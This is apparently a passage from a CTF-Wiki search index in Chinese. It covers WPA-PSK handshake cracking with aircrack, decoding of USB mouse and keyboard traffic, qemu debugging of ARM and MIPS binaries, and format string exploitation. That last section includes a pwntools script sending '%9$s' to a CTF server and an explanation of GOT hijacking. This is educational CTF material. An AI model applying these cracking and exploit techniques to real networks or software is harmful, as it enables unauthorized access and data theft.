\uff08radius\u8ba4\u8bc1\uff09","title":"WIFI"},{"location":"misc/traffic/protocols/#wpa-psk","text":"\u8ba4\u8bc1\u5927\u81f4\u8fc7\u7a0b\u5982\u4e0b\u56fe \u5176\u4e2d\u56db\u6b21\u63e1\u624b\u8fc7\u7a0b 4\u6b21\u63e1\u624b\u5f00\u59cb\u4e8e\u9a8c\u8bc1\u5668(AP)\uff0c\u5b83\u4ea7\u751f\u4e00\u4e2a\u968f\u673a\u7684\u503c(ANonce)\u53d1\u9001\u7ed9\u8bf7\u6c42\u8005 \u8bf7\u6c42\u8005\u4e5f\u4ea7\u751f\u4e86\u5b83\u81ea\u5df1\u7684\u968f\u673aSNonce\uff0c\u7136\u540e\u7528\u8fd9\u4e24\u4e2aNonces\u4ee5\u53caPMK\u751f\u6210\u4e86PTK\u3002\u8bf7\u6c42\u8005\u56de\u590d\u6d88\u606f2\u7ed9\u9a8c\u8bc1\u5668,\u8fd8\u6709\u4e00\u4e2aMIC\uff08message integrity code\uff0c\u6d88\u606f\u9a8c\u8bc1\u7801\uff09\u4f5c\u4e3aPMK\u7684\u9a8c\u8bc1 \u5b83\u5148\u8981\u9a8c\u8bc1\u8bf7\u6c42\u8005\u5728\u6d88\u606f2\u4e2d\u53d1\u6765\u7684MIC\u7b49\u4fe1\u606f\uff0c\u9a8c\u8bc1\u6210\u529f\u540e\uff0c\u5982\u679c\u9700\u8981\u5c31\u751f\u6210GTK\u3002\u7136\u540e\u53d1\u9001\u6d88\u606f3 \u8bf7\u6c42\u8005\u6536\u5230\u6d88\u606f3\uff0c\u9a8c\u8bc1MIC\uff0c\u5b89\u88c5\u5bc6\u94a5\uff0c\u53d1\u9001\u6d88\u606f4\uff0c\u4e00\u4e2a\u786e\u8ba4\u4fe1\u606f\u3002\u9a8c\u8bc1\u5668\u6536\u5230\u6d88\u606f4\uff0c\u9a8c\u8bc1MIC\uff0c\u5b89\u88c5\u76f8\u540c\u7684\u5bc6\u94a5 \u4f8b\u9898 \u5b9e\u9a8c\u5427: http://ctf5.shiyanbar.com/misc/shipin.cap \u4ece\u5927\u91cf\u7684 Deauth \u653b\u51fb\u57fa\u672c\u53ef\u4ee5\u5224\u65ad\u662f\u4e00\u4e2a\u7834\u89e3wifi\u65f6\u7684\u6d41\u91cf\u653b\u51fb \u540c\u65f6\u4e5f\u6210\u529f\u53d1\u73b0\u4e86\u63e1\u624b\u5305\u4fe1\u606f \u63a5\u4e0b\u6765\u8dd1\u5bc6\u7801 linux: aircrack\u5957\u4ef6 windows: wifipr,\u901f\u5ea6\u6bd4esaw\u5feb,GTX850\u80fd\u5c06\u8fd110w\\s :) \u5f97\u5230\u5bc6\u7801 88888888 \u5728wireshark\u4e2d Edit -> Preferences -> Protocols -> IEEE802.11 -> Edit \u4ee5 key:SSID \u5f62\u5f0f\u586b\u5165\u5373\u53ef\u89e3\u5bc6wifi\u5305\u770b\u5230\u660e\u6587\u6d41\u91cf KCARCK\u76f8\u5173: https://www.krackattacks.com/ \u53c2\u8003 http://www.freebuf.com/articles/wireless/58342.html http://blog.csdn.net/keekjkj/article/details/46753883","title":"WPA-PSK"},{"location":"misc/traffic/protocols/#usb","text":"USB\u8be6\u8ff0 : http://www.usb.org/developers/hidpage/Hut1_12v2.pdf \u9f20\u6807\u534f\u8bae \u9f20\u6807\u79fb\u52a8\u65f6\u8868\u73b0\u4e3a\u8fde\u7eed\u6027\uff0c\u4e0e\u952e\u76d8\u51fb\u952e\u7684\u79bb\u6563\u6027\u4e0d\u4e00\u6837\uff0c\u4e0d\u8fc7\u5b9e\u9645\u4e0a\u9f20\u6807\u52a8\u4f5c\u6240\u4ea7\u751f\u7684\u6570\u636e\u5305\u4e5f\u662f\u79bb\u6563\u7684\uff0c\u6bd5\u7adf\u8ba1\u7b97\u673a\u8868\u73b0\u7684\u8fde\u7eed\u6027\u4fe1\u606f\u90fd\u662f\u7531\u5927\u91cf\u79bb\u6563\u4fe1\u606f\u6784\u6210\u7684 \u6bcf\u4e00\u4e2a\u6570\u636e\u5305\u7684\u6570\u636e\u533a\u6709\u56db\u4e2a\u5b57\u8282\uff0c\u7b2c\u4e00\u4e2a\u5b57\u8282\u4ee3\u8868\u6309\u952e\uff0c\u5f53\u53d60x00\u65f6\uff0c\u4ee3\u8868\u6ca1\u6709\u6309\u952e\u3001\u4e3a0x01\u65f6\uff0c\u4ee3\u8868\u6309\u5de6\u952e\uff0c\u4e3a0x02\u65f6\uff0c\u4ee3\u8868\u5f53\u524d\u6309\u952e\u4e3a\u53f3\u952e\u3002\u7b2c\u4e8c\u4e2a\u5b57\u8282\u53ef\u4ee5\u770b\u6210\u662f\u4e00\u4e2asigned byte\u7c7b\u578b\uff0c\u5176\u6700\u9ad8\u4f4d\u4e3a\u7b26\u53f7\u4f4d\uff0c\u5f53\u8fd9\u4e2a\u503c\u4e3a\u6b63\u65f6\uff0c\u4ee3\u8868\u9f20\u6807\u6c34\u5e73\u53f3\u79fb\u591a\u5c11\u50cf\u7d20\uff0c\u4e3a\u8d1f\u65f6\uff0c\u4ee3\u8868\u6c34\u5e73\u5de6\u79fb\u591a\u5c11\u50cf\u7d20\u3002\u7b2c\u4e09\u4e2a\u5b57\u8282\u4e0e\u7b2c\u4e8c\u5b57\u8282\u7c7b\u4f3c\uff0c\u4ee3\u8868\u5782\u76f4\u4e0a\u4e0b\u79fb\u52a8\u7684\u504f\u79fb\u3002 \u5f97\u5230\u8fd9\u4e9b\u70b9\u7684\u4fe1\u606f\u540e,\u5373\u53ef\u6062\u590d\u51fa\u9f20\u6807\u79fb\u52a8\u8f68\u8ff9 Tools UsbMiceDataHacker \u952e\u76d8\u534f\u8bae \u952e\u76d8\u6570\u636e\u5305\u7684\u6570\u636e\u957f\u5ea6\u4e3a8\u4e2a\u5b57\u8282\uff0c\u51fb\u952e\u4fe1\u606f\u96c6\u4e2d\u5728\u7b2c3\u4e2a\u5b57\u8282 \u6839\u636edata\u503c\u4e0e\u5177\u4f53\u952e\u4f4d\u7684\u5bf9\u5e94\u5173\u7cfb \u53ef\u4ece\u6570\u636e\u5305\u6062\u590d\u51fa\u952e\u76d8\u7684\u6848\u4ef6\u4fe1\u606f Tools UsbKeyboardDataHacker \u53c2\u8003 - https://www.anquanke.com/post/id/85218","title":"USB"},{"location":"pwn/arm/environment/","text":"\u73af\u5883\u642d\u5efa \u00b6 \u8fd9\u7bc7\u4e3b\u8981\u4ecb\u7ecd\u4e00\u4e0b\u600e\u4e48\u642d\u5efa\u8fd0\u884c\u548c\u8c03\u8bd5 arm binary \u7684\u73af\u5883(\u57fa\u4e8e qemu, \u65b9\u6cd5\u540c\u6837\u4e5f\u9002\u7528\u4e8e mips \u7684 binary), \u4f7f\u7528\u4e86 jarvis OJ typo(arm)/add(mips) \u4e24\u9053\u9898\u76ee\u7684 binary \u8fdb\u884c\u6f14\u793a \u4e3b\u673a\u4fe1\u606f\uff1a \u00b6 \u4ee5\u4e00\u53f0\u65b0\u88c5\u7684 deepin \u865a\u62df\u673a(\u57fa\u4e8e debian)\u4e3a\u4f8b\uff0c\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b\uff1a \u9884\u5907\u73af\u5883\u5b89\u88c5\uff1a \u00b6 \u5b89\u88c5 git\uff0cgdb \u548c gdb-multiarch\uff0c\u540c\u65f6\u5b89\u88c5 binfmt \u7528\u6765\u8bc6\u522b\u6587\u4ef6\u7c7b\u578b $ sudo apt-get update $ sudo apt-get install git gdb gdb-multiarch $ sudo apt-get install \"binfmt*\" \u5b89\u88c5 gdb \u7684\u63d2\u4ef6 pwndbg\uff08\u6216\u8005 gef \u7b49 gdb plugin\uff09 $ git clone https://github.com/pwndbg/pwndbg $ cd pwndbg $ ./setup.sh \u88c5\u597d\u4e4b\u540e\u5982\u56fe\uff1a \u5b89\u88c5pwntools\uff0c\u4e0d\u5fc5\u8981\uff0c\u4f46\u7edd\u5bf9\u662f\u5199exp\u7684\u795e\u5668 $ sudo pip install pwntools \u5b89\u88c5qemu\uff1a \u00b6 \u6211\u4eec\u5bf9\u7248\u672c\u7684\u8981\u6c42\u4e0d\u662f\u5f88\u4e25\u683c, \u76f4\u63a5\u901a\u8fc7 apt \u7b49\u5305\u7ba1\u7406\u5b89\u88c5\u5373\u53ef $ sudo apt-get install qemu-user \u901a\u8fc7 qemu \u6a21\u62df arm/mips \u73af\u5883\uff0c\u8fdb\u800c\u8fdb\u884c\u8fd0\u884c\u548c\u8c03\u8bd5 \u5b89\u88c5\u5171\u4eab\u5e93\uff1a \u00b6 \u6b64\u65f6\u5df2\u7ecf\u53ef\u4ee5\u8fd0\u884c\u9759\u6001\u94fe\u63a5\u7684 arm/mips binary \u4e86\uff0c\u5982\u4e0b\u56fe\uff1a \u4f46\u8fd8\u4e0d\u80fd\u8fd0\u884c\u52a8\u6001\u94fe\u63a5\u7684 binary\uff0c\u5982\u4e0b\u56fe\uff1a \u8fd9\u5c31\u9700\u8981\u6211\u4eec\u5b89\u88c5\u5bf9\u5e94\u67b6\u6784\u7684\u5171\u4eab\u5e93\uff0c\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u641c\u7d22\uff1a $ apt-cache search \"libc6\" | grep ARCH \u6211\u4eec\u53ea\u9700\u5b89\u88c5\u7c7b\u4f3c libc6-ARCH-cross \u5f62\u5f0f\u7684\u5373\u53ef \u8fd0\u884c\uff1a \u00b6 \u9759\u6001\u94fe\u63a5\u7684 binary \u76f4\u63a5\u8fd0\u884c\u5373\u53ef\uff0c\u4f1a\u81ea\u52a8\u8c03\u7528\u5bf9\u5e94\u67b6\u6784\u7684 qemu\uff1b \u52a8\u6001\u94fe\u63a5\u7684 bianry \u9700\u8981\u7528\u5bf9\u5e94\u7684 qemu \u540c\u65f6\u6307\u5b9a\u5171\u4eab\u5e93\u8def\u5f84\uff0c\u5982\u4e0b\u56fe32\u4f4d\u7684\u52a8\u6001\u94fe\u63a5 mips binary \u4f7f\u7528 -L \u6307\u5b9a\u5171\u4eab\u5e93\u8def\u5f84\uff1a $ qemu-mipsel -L /usr/mipsel-linux-gnu/ ./add \u8c03\u8bd5\uff1a \u00b6 \u53ef\u4ee5\u4f7f\u7528 qemu \u7684 -g \u6307\u5b9a\u7aef\u53e3 $ qemu-mipsel -g 1234 -L /usr/mipsel-linux-gnu/ ./add \u7136\u540e\u4f7f\u7528 gdb-multiarch \u8fdb\u884c\u8c03\u8bd5\uff0c\u5148\u6307\u5b9a\u67b6\u6784\uff0c\u7136\u540e\u4f7f\u7528 remote \u529f\u80fd pwndbg> set architecture mips ( \u4f46\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u8fd9\u4e00\u6b65\u53ef\u4ee5\u7701\u7565, \u4f3c\u4e4e pwndbg \u80fd\u81ea\u52a8\u8bc6\u522b\u67b6\u6784 ) pwndbg> target remote localhost:1234 \u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u8fdb\u884c\u8c03\u8bd5\u4e86 \u6548\u679c\u56fe\uff1a \u00b6 more\uff1a \u00b6 \u540c\u6837\uff0c\u5982\u679c\u60f3\u8981\u8fd0\u884c\u6216\u8005\u8c03\u8bd5\u5176\u4ed6\u67b6\u6784\u7684 binary\uff0c\u53ea\u9700\u5b89\u88c5\u5176\u4ed6\u67b6\u6784\u7684 qemu \u548c\u5171\u4eab\u5e93\u5373\u53ef reference\uff1a \u00b6 https://docs.pwntools.com/en/stable/qemu.html https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain","title":"\u73af\u5883\u642d\u5efa"},{"location":"pwn/arm/environment/#_1","text":"\u8fd9\u7bc7\u4e3b\u8981\u4ecb\u7ecd\u4e00\u4e0b\u600e\u4e48\u642d\u5efa\u8fd0\u884c\u548c\u8c03\u8bd5 arm binary \u7684\u73af\u5883(\u57fa\u4e8e qemu, \u65b9\u6cd5\u540c\u6837\u4e5f\u9002\u7528\u4e8e mips \u7684 binary), \u4f7f\u7528\u4e86 jarvis OJ typo(arm)/add(mips) \u4e24\u9053\u9898\u76ee\u7684 binary \u8fdb\u884c\u6f14\u793a","title":"\u73af\u5883\u642d\u5efa"},{"location":"pwn/arm/environment/#_2","text":"\u4ee5\u4e00\u53f0\u65b0\u88c5\u7684 deepin \u865a\u62df\u673a(\u57fa\u4e8e debian)\u4e3a\u4f8b\uff0c\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b\uff1a","title":"\u4e3b\u673a\u4fe1\u606f\uff1a"},{"location":"pwn/arm/environment/#_3","text":"\u5b89\u88c5 git\uff0cgdb \u548c gdb-multiarch\uff0c\u540c\u65f6\u5b89\u88c5 binfmt \u7528\u6765\u8bc6\u522b\u6587\u4ef6\u7c7b\u578b $ sudo apt-get update $ sudo apt-get install git gdb gdb-multiarch $ sudo apt-get install \"binfmt*\" \u5b89\u88c5 gdb \u7684\u63d2\u4ef6 pwndbg\uff08\u6216\u8005 gef \u7b49 gdb plugin\uff09 $ git clone https://github.com/pwndbg/pwndbg $ cd pwndbg $ ./setup.sh \u88c5\u597d\u4e4b\u540e\u5982\u56fe\uff1a \u5b89\u88c5pwntools\uff0c\u4e0d\u5fc5\u8981\uff0c\u4f46\u7edd\u5bf9\u662f\u5199exp\u7684\u795e\u5668 $ sudo pip install pwntools","title":"\u9884\u5907\u73af\u5883\u5b89\u88c5\uff1a"},{"location":"pwn/arm/environment/#qemu","text":"\u6211\u4eec\u5bf9\u7248\u672c\u7684\u8981\u6c42\u4e0d\u662f\u5f88\u4e25\u683c, \u76f4\u63a5\u901a\u8fc7 apt \u7b49\u5305\u7ba1\u7406\u5b89\u88c5\u5373\u53ef $ sudo apt-get install qemu-user \u901a\u8fc7 qemu \u6a21\u62df arm/mips \u73af\u5883\uff0c\u8fdb\u800c\u8fdb\u884c\u8fd0\u884c\u548c\u8c03\u8bd5","title":"\u5b89\u88c5qemu\uff1a"},{"location":"pwn/arm/environment/#_4","text":"\u6b64\u65f6\u5df2\u7ecf\u53ef\u4ee5\u8fd0\u884c\u9759\u6001\u94fe\u63a5\u7684 arm/mips binary \u4e86\uff0c\u5982\u4e0b\u56fe\uff1a \u4f46\u8fd8\u4e0d\u80fd\u8fd0\u884c\u52a8\u6001\u94fe\u63a5\u7684 binary\uff0c\u5982\u4e0b\u56fe\uff1a \u8fd9\u5c31\u9700\u8981\u6211\u4eec\u5b89\u88c5\u5bf9\u5e94\u67b6\u6784\u7684\u5171\u4eab\u5e93\uff0c\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u641c\u7d22\uff1a $ apt-cache search \"libc6\" | grep ARCH \u6211\u4eec\u53ea\u9700\u5b89\u88c5\u7c7b\u4f3c libc6-ARCH-cross \u5f62\u5f0f\u7684\u5373\u53ef","title":"\u5b89\u88c5\u5171\u4eab\u5e93\uff1a"},{"location":"pwn/arm/environment/#_5","text":"\u9759\u6001\u94fe\u63a5\u7684 binary \u76f4\u63a5\u8fd0\u884c\u5373\u53ef\uff0c\u4f1a\u81ea\u52a8\u8c03\u7528\u5bf9\u5e94\u67b6\u6784\u7684 qemu\uff1b \u52a8\u6001\u94fe\u63a5\u7684 bianry \u9700\u8981\u7528\u5bf9\u5e94\u7684 qemu \u540c\u65f6\u6307\u5b9a\u5171\u4eab\u5e93\u8def\u5f84\uff0c\u5982\u4e0b\u56fe32\u4f4d\u7684\u52a8\u6001\u94fe\u63a5 mips binary \u4f7f\u7528 -L \u6307\u5b9a\u5171\u4eab\u5e93\u8def\u5f84\uff1a $ qemu-mipsel -L /usr/mipsel-linux-gnu/ ./add","title":"\u8fd0\u884c\uff1a"},{"location":"pwn/arm/environment/#_6","text":"\u53ef\u4ee5\u4f7f\u7528 qemu \u7684 -g \u6307\u5b9a\u7aef\u53e3 $ qemu-mipsel -g 1234 -L /usr/mipsel-linux-gnu/ ./add \u7136\u540e\u4f7f\u7528 gdb-multiarch \u8fdb\u884c\u8c03\u8bd5\uff0c\u5148\u6307\u5b9a\u67b6\u6784\uff0c\u7136\u540e\u4f7f\u7528 remote \u529f\u80fd pwndbg> set architecture mips ( \u4f46\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u8fd9\u4e00\u6b65\u53ef\u4ee5\u7701\u7565, \u4f3c\u4e4e pwndbg \u80fd\u81ea\u52a8\u8bc6\u522b\u67b6\u6784 ) pwndbg> target remote localhost:1234 \u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u8fdb\u884c\u8c03\u8bd5\u4e86","title":"\u8c03\u8bd5\uff1a"},{"location":"pwn/arm/environment/#_7","text":"","title":"\u6548\u679c\u56fe\uff1a"},{"location":"pwn/arm/environment/#more","text":"\u540c\u6837\uff0c\u5982\u679c\u60f3\u8981\u8fd0\u884c\u6216\u8005\u8c03\u8bd5\u5176\u4ed6\u67b6\u6784\u7684 binary\uff0c\u53ea\u9700\u5b89\u88c5\u5176\u4ed6\u67b6\u6784\u7684 qemu \u548c\u5171\u4eab\u5e93\u5373\u53ef","title":"more\uff1a"},{"location":"pwn/arm/environment/#reference","text":"https://docs.pwntools.com/en/stable/qemu.html https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain","title":"reference\uff1a"},{"location":"pwn/fmtstr/fmtstr_detect/","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u68c0\u6d4b \u00b6 \u8fd9\u91cc\u63a8\u8350\u4e00\u4e2a\u7b80\u5355\u7684\u5de5\u5177 LazyIDA \u3002\u57fa\u672c\u7684\u68c0\u6d4b\u5e94\u8be5\u6ca1\u6709\u95ee\u9898\u3002","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u68c0\u6d4b"},{"location":"pwn/fmtstr/fmtstr_detect/#_1","text":"\u8fd9\u91cc\u63a8\u8350\u4e00\u4e2a\u7b80\u5355\u7684\u5de5\u5177 LazyIDA \u3002\u57fa\u672c\u7684\u68c0\u6d4b\u5e94\u8be5\u6ca1\u6709\u95ee\u9898\u3002","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u68c0\u6d4b"},{"location":"pwn/fmtstr/fmtstr_example/","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50 \u00b6 \u4e0b\u9762\u4f1a\u4ecb\u7ecd\u4e00\u4e9bCTF\u4e2d\u7684\u683c\u5f0f\u5316\u6f0f\u6d1e\u7684\u9898\u76ee\u3002\u4e5f\u90fd\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5e38\u89c1\u7684\u5229\u7528\u3002 64\u4f4d\u7a0b\u5e8f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u00b6 \u539f\u7406 \u00b6 \u5176\u5b9e64\u4f4d\u7684\u504f\u79fb\u8ba1\u7b97\u548c32\u4f4d\u7c7b\u4f3c\uff0c\u90fd\u662f\u7b97\u5bf9\u5e94\u7684\u53c2\u6570\u3002\u53ea\u4e0d\u8fc764\u4f4d\u51fd\u6570\u7684\u524d6\u4e2a\u53c2\u6570\u662f\u5b58\u50a8\u5728\u76f8\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\u7684\u3002\u90a3\u4e48\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\u5462\uff1f\u867d\u7136\u6211\u4eec\u5e76\u6ca1\u6709\u5411\u76f8\u5e94\u5bc4\u5b58\u5668\u4e2d\u653e\u5165\u6570\u636e\uff0c\u4f46\u662f\u7a0b\u5e8f\u4f9d\u65e7\u4f1a\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5e94\u683c\u5f0f\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\uff0c\u6211\u4eec\u4ee52017\u5e74\u7684UIUCTF\u4e2dpwn200 GoodLuck\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u91cc\u7531\u4e8e\u53ea\u6709\u672c\u5730\u73af\u5883\uff0c\u6240\u4ee5\u6211\u5728\u672c\u5730\u8bbe\u7f6e\u4e86\u4e00\u4e2aflag.txt\u6587\u4ef6\u3002 \u786e\u5b9a\u4fdd\u62a4 \u00b6 \u279c 2017 -UIUCTF-pwn200-GoodLuck git: ( master ) \u2717 checksec goodluck Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5f00\u542f\u4e86NX\u4fdd\u62a4\u4ee5\u53ca\u90e8\u5206RELRO\u4fdd\u62a4\u3002 \u5206\u6790\u7a0b\u5e8f \u00b6 \u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f88\u660e\u663e for ( j = 0 ; j <= 21 ; ++ j ) { v5 = format [ j ]; if ( ! v5 || v11 [ j ] != v5 ) { puts ( \"You answered:\" ); printf ( format ); puts ( \" \\n But that was totally wrong lol get rekt\" ); fflush ( _bss_start ); result = 0 ; goto LABEL_11 ; } } \u786e\u5b9a\u504f\u79fb \u00b6 \u6211\u4eec\u5728printf\u5904\u4e0b\u504f\u79fb\u5982\u4e0b,\u8fd9\u91cc\u53ea\u5173\u6ce8\u4ee3\u7801\u90e8\u5206\u4e0e\u6808\u90e8\u5206\u3002 gef\u27a4 b printf Breakpoint 1 at 0x400640 gef\u27a4 r Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck what 's the flag 123456 You answered: Breakpoint 1, __printf (format=0x602830 \"123456\") at printf.c:28 28 printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55. \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x7ffff7a627f7 <fprintf+135> add rsp, 0xd8 0x7ffff7a627fe <fprintf+142> ret 0x7ffff7a627ff nop \u2192 0x7ffff7a62800 <printf+0> sub rsp, 0xd8 0x7ffff7a62807 <printf+7> test al, al 0x7ffff7a62809 <printf+9> mov QWORD PTR [rsp+0x28], rsi 0x7ffff7a6280e <printf+14> mov QWORD PTR [rsp+0x30], rdx \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 [' 0x7fffffffdb08 ', ' l8 ' ] 8 0x00007fffffffdb08\u2502+0x00: 0x0000000000400890 \u2192 <main+234> mov edi, 0x4009b8 \u2190 $rsp 0x00007fffffffdb10\u2502+0x08: 0x0000000031000001 0x00007fffffffdb18\u2502+0x10: 0x0000000000602830 \u2192 0x0000363534333231 ( \"123456\" ? ) 0x00007fffffffdb20\u2502+0x18: 0x0000000000602010 \u2192 \"You answered:\\ng\" 0x00007fffffffdb28\u2502+0x20: 0x00007fffffffdb30 \u2192 \"flag{11111111111111111\" 0x00007fffffffdb30\u2502+0x28: \"flag{11111111111111111\" 0x00007fffffffdb38\u2502+0x30: \"11111111111111\" 0x00007fffffffdb40\u2502+0x38: 0x0000313131313131 ( \"111111\" ? ) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0x7ffff7a62800 \u2192 Name: __printf(format=0x602830 \"123456\") [ #1] 0x400890 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u53ef\u4ee5\u770b\u5230flag\u5bf9\u5e94\u7684\u6808\u4e0a\u7684\u504f\u79fb\u4e3a5\uff0c\u9664\u53bb\u5bf9\u5e94\u7684\u7b2c\u4e00\u884c\u4e3a\u8fd4\u56de\u5730\u5740\u5916\uff0c\u5176\u504f\u79fb\u4e3a4\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a64\u4f4d\u7a0b\u5e8f\uff0c\u6240\u4ee5\u524d6\u4e2a\u53c2\u6570\u5b58\u5728\u5728\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0cfmt\u5b57\u7b26\u4e32\u5b58\u50a8\u5728RDI\u5bc4\u5b58\u5668\u4e2d\uff0c\u6240\u4ee5fmt\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u7684\u504f\u79fb\u4e3a10\u3002\u800cfmt\u5b57\u7b26\u4e32\u4e2d %order$s \u5bf9\u5e94\u7684order\u4e3afmt\u5b57\u7b26\u4e32\u540e\u9762\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165 %9$s \u5373\u53ef\u5f97\u5230flag\u7684\u5185\u5bb9\u3002\u5f53\u7136\uff0c\u6211\u4eec\u8fd8\u6709\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u5229\u7528https://github.com/scwuaptx/Pwngdb\u4e2d\u7684fmtarg\u6765\u5224\u65ad\u67d0\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u3002 gef\u27a4 fmtarg 0x00007fffffffdb28 The index of format argument : 10 \u9700\u8981\u6ce8\u610f\u7684\u662f\u6211\u4eec\u5fc5\u987bbreak\u5728printf\u5904\u3002 \u5229\u7528\u7a0b\u5e8f \u00b6 from pwn import * from LibcSearcher import * goodluck = ELF ( './goodluck' ) if args [ 'REMOTE' ]: sh = remote ( 'pwn.sniperoj.cn' , 30017 ) else : sh = process ( './goodluck' ) payload = \"%9$s\" print payload ##gdb.attach(sh) sh . sendline ( payload ) print sh . recv () sh . interactive () hijack GOT \u00b6 \u539f\u7406 \u00b6 \u5728\u76ee\u524d\u7684C\u7a0b\u5e8f\u4e2d\uff0clibc\u4e2d\u7684\u51fd\u6570\u90fd\u662f\u901a\u8fc7GOT\u8868\u6765\u8df3\u8f6c\u7684\u3002\u6b64\u5916\uff0c\u5728 \u6ca1\u6709\u5f00\u542fRELRO\u4fdd\u62a4\u7684\u524d\u63d0\u4e0b\uff0c\u6bcf\u4e2alibc\u7684\u51fd\u6570\u5bf9\u5e94\u7684GOT\u8868\u9879\u662f\u53ef\u4ee5\u88ab\u4fee\u6539\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e2alibc\u51fd\u6570\u7684GOT\u8868\u5185\u5bb9\u4e3a\u53e6\u4e00\u4e2alibc\u51fd\u6570\u7684\u5730\u5740\u6765\u5b9e\u73b0\u5bf9\u7a0b\u5e8f\u7684\u63a7\u5236\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u4fee\u6539printf\u7684got\u8868\u9879\u5185\u5bb9\u4e3asystem\u51fd\u6570\u7684\u5730\u5740\u3002\u4ece\u800c\uff0c\u7a0b\u5e8f\u5728\u6267\u884cprintf\u7684\u65f6\u5019\u5b9e\u9645\u6267\u884c\u7684\u662fsystem\u51fd\u6570\u3002 \u5047\u8bbe\u6211\u4eec\u5c06\u51fd\u6570A\u7684\u5730\u5740\u8986\u76d6\u4e3a\u51fd\u6570B\u7684\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e00\u653b\u51fb\u6280\u5de7\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u6b65\u9aa4 \u786e\u5b9a\u51fd\u6570A\u7684GOT\u8868\u5730\u5740\u3002 